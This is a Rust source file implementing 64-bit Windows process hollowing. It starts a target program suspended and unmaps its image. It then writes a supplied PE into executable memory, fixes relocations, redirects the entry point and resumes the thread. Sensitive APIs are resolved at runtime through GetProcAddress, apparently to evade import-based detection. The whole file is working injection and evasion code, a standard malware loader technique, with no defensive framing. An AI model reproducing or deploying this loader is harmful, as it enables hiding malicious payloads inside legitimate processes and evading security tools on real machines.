

use anyhow::*;
use winapi::um::{
    processthreadsapi::{
        PROCESS_INFORMATION,
        STARTUPINFOA,
    },
    winnt::{
        CONTEXT
    },
};
use windows_sys::Win32::Foundation::HINSTANCE;
use core::{ffi::c_void, ptr::null_mut, mem::{transmute, size_of}};
use windows_sys::{core::PCSTR};
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, GetModuleHandleA};
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE,};
use windows_sys::Wdk::System::Threading::{PROCESSINFOCLASS};
use windows_sys::Win32::System::Threading::{PROCESS_BASIC_INFORMATION};
use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, IMAGE_DATA_DIRECTORY, IMAGE_DIRECTORY_ENTRY_BASERELOC,CONTEXT_ALL_X86};
use  windows_sys::Win32::System::SystemServices::{IMAGE_REL_BASED_HIGHLOW,IMAGE_REL_BASED_DIR64, IMAGE_BASE_RELOCATION};
use log::{debug, error, info, warn};

pub fn hollow64(buf: &mut Vec<u8>, dest: &str) -> Result<()> {
    // 1. Retrieve functions with GetProcAddress
    info!("1. Retrieve functions with GetProcAddress");
    unsafe{
        // Create functions pointers. Source : https://github.com/memN0ps/srdi-rs
        #[allow(non_camel_case_types)]
        type fnCreateProcessA = unsafe extern "system" fn(
            lpApplicationName: PCSTR,
            lpCommandLine: PCSTR,
            lpProcessAttributes: *mut c_void,
            lpThreadAttributes: *mut c_void,
            bInheritHandles: i32,
            dwCreationFlags: u32,
            lpEnvironment: *mut c_void,
            lpCurrentDirectory: PCSTR,
            lpStartupInfo: *mut STARTUPINFOA,
            lpProcessInformation: *mut PROCESS_INFORMATION
        ) -> HINSTANCE;
        let mut CreateProcessA = transmute::<_, fnCreateProcessA>(0x00000 as  usize); //dummy assignation
    
        #[allow(non_camel_case_types)]
        type fnNtQueryInformationProcess = unsafe extern "system" fn(
            ProcessHandle: HINSTANCE,
            ProcessInformationClass: PROCESSINFOCLASS,
            ProcessInformation: *mut c_void,
            ProcessInformationLength: u32,
            ReturnLength: *mut i32
        ) -> HINSTANCE;
        let mut NtQueryInformationProcess = transmute::<_, fnNtQueryInformationProcess>(0x00000 as  usize); //dummy assignation

        #[allow(non_camel_case_types)]
        type fnReadProcessMemory = unsafe extern "system" fn(
            hProcess: HINSTANCE,
            lpBaseAddress: *mut c_void,
            lpBuffer: *mut c_void,
            nSize: usize,
            lpNumberOfBytesRead: *mut usize
        ) -> HINSTANCE;
        let mut ReadProcessMemory = transmute::<_, fnReadProcessMemory>(0x00000 as  usize); //dummy assignation

        #[allow(non_camel_case_types)]
        type fnNtUnmapViewOfSection = unsafe extern "system" fn(
            hProcess: HINSTANCE,
            lpBaseAddress: *mut c_void
        ) -> HINSTANCE;
        let mut NtUnmapViewOfSection = transmute::<_, fnNtUnmapViewOfSection>(0x00000 as  usize); //dummy assignation

        #[allow(non_camel_case_types)]
        type fnVirtualAlloc = unsafe extern "system" fn(
            lpaddress: *const c_void, 
            dwsize: usize, 
            flallocationtype: VIRTUAL_ALLOCATION_TYPE, 
            flprotect: PAGE_PROTECTION_FLAGS
        ) -> *mut c_void;
        let mut VirtualAlloc = transmute::<_, fnVirtualAlloc>(0x00000 as  usize); //dummy assignation

        #[allow(non_camel_case_types)]
        type fnVirtualAllocEx = unsafe extern "system" fn(
            hProcess: HINSTANCE,
            lpaddress: *const c_void, 
            dwsize: usize, 
            flallocationtype: VIRTUAL_ALLOCATION_TYPE, 
            flprotect: PAGE_PROTECTION_FLAGS
        ) -> *mut c_void;
        let mut VirtualAllocEx = transmute::<_, fnVirtualAllocEx>(0x00000 as  usize); //dummy assignation

        #[allow(non_camel_case_types)]
        type fnWriteProcessMemory = unsafe extern "system" fn(
            hProcess: HINSTANCE,
            lpaddress: *const c_void, 
            lpBuffer: *const c_void, 
            nsize: usize, 
            lpNumberOfBytesWritten: *mut usize
        ) -> *mut c_void;
        let mut WriteProcessMemory = transmute::<_, fnWriteProcessMemory>(0x00000 as  usize); //dummy assignation

        #[allow(non_camel_case_types)]
        type fnGetThreadContext = unsafe extern "system" fn(
            hThread: HINSTANCE,
            lpContext: *mut CONTEXT
        ) -> *mut c_void;
        let mut GetThreadContext = transmute::<_, fnGetThreadContext>(0x00000 as  usize); //dummy assignation

        #[allow(non_camel_case_types)]
        type fnSetThreadContext = unsafe extern "system" fn(
            hThread: HINSTANCE,
            lpContext: *mut CONTEXT
        ) -> *mut c_void;
        let mut SetThreadContext = transmute::<_, fnSetThreadContext>(0x00000 as  usize); //dummy assignation

        #[allow(non_camel_case_types)]
        type fnResumeThread = unsafe extern "system" fn(
            hThread: HINSTANCE
        ) -> *mut c_void;
        let mut ResumeThread = transmute::<_, fnResumeThread>(0x00000 as  usize); //dummy assignation
        
        // Find functions addr

        //get  kernel32 address
        let module_name = "KERNEL32.dll\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
        let kernel32_handle:usize = GetModuleHandleA(module_name.as_ptr() as *const u8) as usize;

        if kernel32_handle == 0 {
            debug!("Failed to get module handle kernel32.");
        } else {
            debug!("Module handle kernel32: {:x}", kernel32_handle);
        }

        //get  ntdll address
        let module_name = "ntdll.dll\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
        let ntdll_handle:usize = GetModuleHandleA(module_name.as_ptr() as *const u8) as usize;

        if ntdll_handle == 0 {
            debug!("Failed to get module handle ntdll.");
        } else {
            debug!("Module handle ntdll: {:x}", ntdll_handle);
        }
    
        //Retrieve CreateProcessA address
        let mut function_name: &str = "CreateProcessA\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
        let mut CreateProcessA_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
        CreateProcessA = transmute::<_, fnCreateProcessA>(CreateProcessA_p);

        //Retrieve NtQueryInformationProcess address
        let mut function_name: &str = "NtQueryInformationProcess\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
        let mut NtQueryInformationProcess_p:  usize = GetProcAddress(ntdll_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
        NtQueryInformationProcess = transmute::<_, fnNtQueryInformationProcess>(NtQueryInformationProcess_p);

        //Retrieve ReadProcessMemory_p address
        let mut function_name: &str = "ReadProcessMemory\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
        let mut ReadProcessMemory_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
        debug!("ReadProcessMemory_p : {}",ReadProcessMemory_p);
        ReadProcessMemory = transmute::<_, fnReadProcessMemory>(ReadProcessMemory_p);

        //Retrieve NtUnmapViewOfSection address
        let mut function_name: &str = "NtUnmapViewOfSection\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
        let mut NtUnmapViewOfSection_p:  usize = GetProcAddress(ntdll_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
        debug!("NtUnmapViewOfSection_p : {}",NtUnmapViewOfSection_p);
        NtUnmapViewOfSection = transmute::<_, fnNtUnmapViewOfSection>(NtUnmapViewOfSection_p);

        //Retrieve VirtualAlloc address
        let mut function_name: &str = "VirtualAlloc\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
        let mut VirtualAlloc_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
        debug!("VirtualAlloc_p : {}",VirtualAlloc_p);

        //Retrieve VirtualAllocEx address
        let mut function_name: &str = "VirtualAllocEx\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
        let mut VirtualAllocEx_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
        debug!("VirtualAllocEx_p : {}",VirtualAllocEx_p);
        VirtualAllocEx = transmute::<_, fnVirtualAllocEx>(VirtualAllocEx_p);

        //Retrieve WriteProcessMemory address
        let mut function_name: &str = "WriteProcessMemory\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
        let mut WriteProcessMemory_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
        debug!("WriteProcessMemory_p : {}",WriteProcessMemory_p);
        WriteProcessMemory = transmute::<_, fnWriteProcessMemory>(WriteProcessMemory_p);

        //Retrieve GetThreadContext address
        let mut function_name: &str = "GetThreadContext\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
        let mut GetThreadContext_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
        debug!("GetThreadContext_p : {}",GetThreadContext_p);
        GetThreadContext = transmute::<_, fnGetThreadContext>(GetThreadContext_p);

        //Retrieve SetThreadContext address
        let mut function_name: &str = "SetThreadContext\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
        let mut SetThreadContext_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
        debug!("SetThreadContext_p : {}",SetThreadContext_p);
        SetThreadContext = transmute::<_, fnSetThreadContext>(SetThreadContext_p);

        //Retrieve ResumeThread address
        let mut function_name: &str = "ResumeThread\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
        let mut ResumeThread_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
        debug!("ResumeThread_p : {}",ResumeThread_p);
        ResumeThread = transmute::<_, fnResumeThread>(ResumeThread_p);

        // 2. Create remote process with CreateProcessA
        info!("2. Create remote process with CreateProcessA");
        let pe_to_execute = dest.trim().to_owned() + "\0"; //MSP Add

        let mut lp_startup_info: STARTUPINFOA = std::mem::zeroed();
        let mut lp_process_information: PROCESS_INFORMATION = std::mem::zeroed();
        CreateProcessA(
            null_mut(),
            pe_to_execute.as_ptr() as *mut _,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            0x00000004,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut lp_startup_info as *mut STARTUPINFOA,
            &mut lp_process_information as *mut PROCESS_INFORMATION,
        );
        let mut startup = lp_startup_info;
        let mut process_info =  lp_process_information;
        
        // 3. Get remote base address of created process
        info!("3. Get remote base address of created process");

        let hp = lp_process_information.hProcess;

        let mut process_information: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
        let process_information_class = PROCESSINFOCLASS::default();
        let mut return_l = 0;
        debug!("MSP lp_process_information.dwProcessId {}",lp_process_information.dwProcessId);
        NtQueryInformationProcess(
            lp_process_information.hProcess as isize, //ProcessHandle
            process_information_class, //ProcessInformationClass
            &mut process_information as *mut _ as *mut c_void, //ProcessInformation
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32, //ProcessInformationLength
            &mut return_l, //ReturnLength
        );
        let peb_image_offset = process_information.PebBaseAddress as u64 + 0x10;
        let mut image_base_buffer = [0; std::mem::size_of::<&u8>()]; //create an array of 8 bytes, std::mem::size_of::<&u8>() returns size of reference : 8 bytes
        ReadProcessMemory(
            lp_process_information.hProcess as isize, //hProcess
            peb_image_offset as *mut c_void, //lpBaseAddress
            image_base_buffer.as_mut_ptr() as *mut c_void, //lpBuffer
            image_base_buffer.len(), //nSize
            std::ptr::null_mut(), //*lpNumberOfBytesRead
        );
        debug!("remote_base {:?}", image_base_buffer);
        let remote_pe_base_address_original =usize::from_ne_bytes(image_base_buffer) ;
        debug!("remote_pe_base_address {:x}", remote_pe_base_address_original);

        let mut dest_image_base_address: *mut c_void = remote_pe_base_address_original as *mut c_void;
        
        // 4. Unmap image from remote process with base address previously retrieved
        info!("4. Unmap image from remote process with base address previously retrieved");
        NtUnmapViewOfSection(
            lp_process_information.hProcess as isize,
            remote_pe_base_address_original as *mut c_void
        );

        // 5. parse PE to inject to get : SizeOfImage, original base address (used to calculate delta for base reloc), reloc. table
        info!("5. parse PE to inject to get : SizeOfImage, original base address (used to calculate delta for base reloc), reloc. table");

        let pe_to_inject_base_addr = buf.as_mut_ptr() as *mut c_void;
        let loaded_module_base = pe_to_inject_base_addr;
        let dos_header: *mut IMAGE_DOS_HEADER = loaded_module_base as *mut IMAGE_DOS_HEADER;

        debug!("Magic : {:x}",(*dos_header).e_magic);
        let module_dos_headers: *mut IMAGE_DOS_HEADER = pe_to_inject_base_addr as *mut IMAGE_DOS_HEADER;
        let module_nt_headers_ptr = pe_to_inject_base_addr as usize + (*module_dos_headers).e_lfanew as  usize;
        let module_nt_headers: *mut IMAGE_NT_HEADERS64 = module_nt_headers_ptr as *mut IMAGE_NT_HEADERS64; //32bits_spec - line add
        
        //get size of pe to inject
        let pe_to_inject_size = (*module_nt_headers).OptionalHeader.SizeOfImage;
        debug!("pe_to_inject_size : {:x}",pe_to_inject_size);
        
        // Store original base address
        let mut old_source_image_base_address = (*module_nt_headers).OptionalHeader.ImageBase as u64;

        // 6. Alloc memory in remote process
        info!("6. Alloc memory in remote process with VirtualAllocEx");

        let mut allocated_memory_addr = VirtualAllocEx(
            lp_process_information.hProcess as isize, //hProcess
            remote_pe_base_address_original as *mut c_void,//lpaddress
            pe_to_inject_size as usize,//dwsize
            MEM_COMMIT | MEM_RESERVE,//flallocationtype
            PAGE_EXECUTE_READWRITE//flprotect
        );
        let mut new_dest_image_base_address : *mut c_void = allocated_memory_addr;
        debug!("________________ remote_pe_base_address_original : {:?}",dest_image_base_address);
        debug!("________________ remote_pe_base_address : {:?}",new_dest_image_base_address);

        if new_dest_image_base_address as u64 == 0x0 as u64 {
            bail!("could not allocate of the remote process image. VirtualAllocEx calling was failed.");
        };

        // 7. Change base address (with value got at step 6 = value got a step 3) of PE to inject before writing it in remote process
        info!("7. Change base address (with value got at step 6 = value got a step 3) of PE to inject before writing it in remote process");

        (*module_nt_headers).OptionalHeader.ImageBase = new_dest_image_base_address as u64; // ??
       
        // 8. Copy headers of injected process to remote process
        info!("8. Copy headers of injected process to remote process");

        let sizeofheaders = (*module_nt_headers).OptionalHeader.SizeOfHeaders;
        debug!("headers base address : {:?}",new_dest_image_base_address);
        WriteProcessMemory(
            lp_process_information.hProcess as isize,//hProcess
            new_dest_image_base_address as *mut c_void,//lpaddress 
            loaded_module_base,//lpBuffer 
            sizeofheaders as usize,//nsize
            std::ptr::null_mut(), //*lpNumberOfBytesRead
        );

        // 9. Copy sections of injected process to remote process
        info!("9. Copy sections of injected process to remote process");

        // 10. Perform base relocation
        info!("10. Perform base relocation");

        // get the VA of the first section header
        let optional_headers_ptr = &(*module_nt_headers).OptionalHeader as *const _ as usize; // get a pointer to OptionalHeader
        let mut first_section: *mut c_void = (optional_headers_ptr as  usize + (*module_nt_headers).FileHeader.SizeOfOptionalHeader as usize) as *mut c_void;

        // itterate through all sections, loading them into memory.
        let mut number_of_sections =  (*module_nt_headers).FileHeader.NumberOfSections;

        while number_of_sections > 0 {
            // get the RVA of the section
            let mut section_headers: *mut IMAGE_SECTION_HEADER = first_section as *mut IMAGE_SECTION_HEADER; 
            let mut section_RVA = (*section_headers).VirtualAddress;

            
            // get the a ptr to new section VA
            let mut new_section_VA = (new_dest_image_base_address as *mut u8).add(section_RVA as usize);

            // get a ptr the section data
            let mut section_data = (loaded_module_base as usize + (*section_headers).PointerToRawData as usize) as *mut usize;
            // get the section data size
            let mut section_data_size = (*section_headers).SizeOfRawData;
                       
            debug!("new_section_VA : {:?}",new_section_VA);
            WriteProcessMemory(
                lp_process_information.hProcess as isize,//hProcess
                new_section_VA as *mut c_void,//lpaddress 
                section_data as *mut c_void,//lpBuffer 
                section_data_size as usize,//nsize
                std::ptr::null_mut(), //*lpNumberOfBytesRead
            );

            // get IMAGE_SECTION_HEADER_size 
            let IMAGE_SECTION_HEADER_size = core::mem::size_of::<IMAGE_SECTION_HEADER>(); // usually 40 bytes
            // go to the next section headers 
            first_section = (first_section as *mut u8).add(40) as *mut c_void;
            
            number_of_sections -= 1;
        }

        // Perform base relocation

        let base_address_delta = (new_dest_image_base_address  as isize - old_source_image_base_address as isize);

        // get the address of the relocation directory
        let mut relocation_directory =  (*module_nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];

        // check if their are any relocations present
        if relocation_directory.Size != 0 {

            // get the first entry (IMAGE_BASE_RELOCATION)
            let relocation_directory_ptr = &mut relocation_directory as *mut _;
            let relocation_directory_IMAGE_DATA_DIRECTORY : *mut IMAGE_DATA_DIRECTORY = relocation_directory_ptr as *mut IMAGE_DATA_DIRECTORY; 
            let mut first_entry_va =  (new_dest_image_base_address as *mut u8).add(((*relocation_directory_IMAGE_DATA_DIRECTORY).VirtualAddress) as usize);

            let reloc_size = (*relocation_directory_IMAGE_DATA_DIRECTORY).Size;

            //Read first reloc block via remote process (easier beceause not mapped mapped in current process memory)
            let mut reloc_table_buf = vec![0; reloc_size as usize]; 
            ReadProcessMemory(
                lp_process_information.hProcess as isize,//hProcess
                first_entry_va as *mut c_void,//lpBaseAddress
                reloc_table_buf.as_mut_ptr() as *mut c_void,//lpBuffer
                (*relocation_directory_IMAGE_DATA_DIRECTORY).Size as usize,//nSize
                std::ptr::null_mut()//lpNumberOfBytesRead
            );
            let first_entry_vad = reloc_table_buf.as_mut_ptr() as *mut usize;
            debug!("first_entry_va deref: {:x}",(*first_entry_vad) as u32);
            let mut first_entry_va = reloc_table_buf.as_mut_ptr() as *mut c_void;

            // and we itterate through all entries...
            let mut first_entry_IMAGE_BASE_RELOC = first_entry_va as *mut IMAGE_BASE_RELOCATION;
            debug!("msp ici first_entry_va : {:?}",first_entry_va);
            let mut first_entry_IMAGE_BASE_RELOC_size_block = (*first_entry_IMAGE_BASE_RELOC).SizeOfBlock;
            let mut count = 0;
            while (first_entry_IMAGE_BASE_RELOC_size_block != 0) {
                // get the VA for this relocation block
                let relocation_block_VA = new_dest_image_base_address  as usize +  (*first_entry_IMAGE_BASE_RELOC).VirtualAddress as usize;
                let mut entries_number = ((*first_entry_IMAGE_BASE_RELOC).SizeOfBlock as usize - size_of::<IMAGE_BASE_RELOCATION>()) / size_of::<u16>() ;
                let first_entry_in_block: *const u16 = first_entry_va.add(size_of::<IMAGE_BASE_RELOCATION>()) as *const u16; // IMAGE_BASE_RELOCATION size should be 8
                
                // we itterate through all the entries in the current block...
                for i in 0..entries_number {

                    // perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
                    // we dont use a switch statement to avoid the compiler building a jump table
                    // which would not be very position independent!
                    let type_field: u32 = (first_entry_in_block.offset(i as isize).read() >> 12) as u32;
                    let offset = first_entry_in_block.offset(i as isize).read() & 0xFFF;
                    if type_field == IMAGE_REL_BASED_DIR64 || type_field == IMAGE_REL_BASED_HIGHLOW {
                        // Read the original value at the final address
                        let mut original_address: u64 = 0; // Directly use a u32 variable
                        let ogaddress = ReadProcessMemory(
                            lp_process_information.hProcess as isize,//hProcess
                            (relocation_block_VA  +  offset as usize) as *mut c_void,//lpBaseAddress
                            &mut original_address as *mut _ as *mut c_void,//lpBuffer
                            std::mem::size_of::<u64>(),//nSize
                            std::ptr::null_mut()//lpNumberOfBytesRead
                        );
                        // Calculate the fixed address of the relocation
                        let fixedaddress = (original_address as isize + base_address_delta as isize) as isize;

                        //Write the fixed address to the final address
                        //write((relocation_block_VA + offset as usize) as *mut usize, fixedaddress as usize);
                        WriteProcessMemory(
                            lp_process_information.hProcess as isize,//hProcess
                            (relocation_block_VA + offset as usize) as *mut c_void,//lpaddress 
                            &fixedaddress as *const _ as *const c_void,//lpBuffer 
                            std::mem::size_of::<u64>(),//nsize
                            std::ptr::null_mut(), //*lpNumberOfBytesRead
                        );
                    }
                }

                // get the next entry in the relocation directory
                first_entry_va = first_entry_va.add(first_entry_IMAGE_BASE_RELOC_size_block as usize);
                first_entry_IMAGE_BASE_RELOC = first_entry_va as *mut IMAGE_BASE_RELOCATION;
                first_entry_IMAGE_BASE_RELOC_size_block = (*first_entry_IMAGE_BASE_RELOC).SizeOfBlock;
                count += 1;
            }
        }

        // 11. If address returned by VirtualAllocEx (Step 6) is different from value in remote process PEB (Step 3), modify PEB value
        info!("11. If address returned by VirtualAllocEx (Step 6) is different from value in remote process PEB (Step 3), modify PEB value");

        if new_dest_image_base_address as *mut winapi::ctypes::c_void != dest_image_base_address as *mut winapi::ctypes::c_void  {
            WriteProcessMemory(
                hp as isize,
                (dest_image_base_address as u64 + 0x10) as _,
                new_dest_image_base_address,
                std::mem::size_of::<*mut c_void>(),
                null_mut(),
            );
        }

        // 12. create new thread context : From https://www.timdbg.com/posts/writing-a-debugger-from-scratch-part-2/
        info!("12. create new thread context");
        #[repr(align(16))]
        struct AlignedContext {
            context: CONTEXT,
        }
        let mut ctx: AlignedContext = unsafe { std::mem::zeroed() };
        ctx.context.ContextFlags = CONTEXT_ALL_X86;

        let entry_point = new_dest_image_base_address as u64 + (*module_nt_headers).OptionalHeader.AddressOfEntryPoint as u64;

        // 13. GetThreadContext on remote process
        info!("13. GetThreadContext on remote process");
        if GetThreadContext(
            lp_process_information.hThread as isize, 
            &mut ctx.context) 
        == std::ptr::null_mut() {
            debug!("could not get thread context");
        }

        // 14. Modify RCX which contains entry point value and apply new value with SetThreadContext
        info!("14. Modify RCX which contains entry point value and apply new value with SetThreadContext");
        ctx.context.Rcx = entry_point;
        if SetThreadContext(lp_process_information.hThread as isize, &mut ctx.context) == std::ptr::null_mut() {
            debug!("could not set thread context");
        }

        // 15. Resume thread
        info!("15. Resume thread");
        if ResumeThread(lp_process_information.hThread as isize) == std::ptr::null_mut() { //no sens
            debug!("could not set thread context");
        }

        // remove debug print
        info!("Process hollowing done");

        Ok(())
    }
}
pub fn step(){
    println!("Press Enter to continue...");
    use std::io;
    use std::io::prelude::*;
    // Wait for user input
    let mut input = String::new();
    io::stdin().read_line(&mut input).expect("Failed to read line");
}


#[repr(C)]
pub struct IMAGE_DOS_HEADER {
    pub e_magic: u16,    // Magic number
    pub e_cblp: u16,     // Bytes on last page of file
    pub e_cp: u16,       // Pages in file
    pub e_crlc: u16,     // Relocations
    pub e_cparhdr: u16,  // Size of header in paragraphs
    pub e_minalloc: u16, // Minimum extra paragraphs needed
    pub e_maxalloc: u16, // Maximum extra paragraphs needed
    pub e_ss: u16,       // Initial (relative) SS value
    pub e_sp: u16,       // Initial SP value
    pub e_csum: u16,     // Checksum
    pub e_ip: u16,       // Initial IP value
    pub e_cs: u16,       // Initial (relative) CS value
    pub e_lfarlc: u16,   // File address of relocation table
    pub e_ovno: u16,     // Overlay number
    pub e_res: [u16; 4], // Reserved words
    pub e_oemid: u16,    // OEM identifier (for e_oeminfo)
    pub e_oeminfo: u16,  // OEM information; e_oemid specific
    pub e_res2: [u16; 10], // Reserved words
    pub e_lfanew: i32,   // File address of new exe header
}
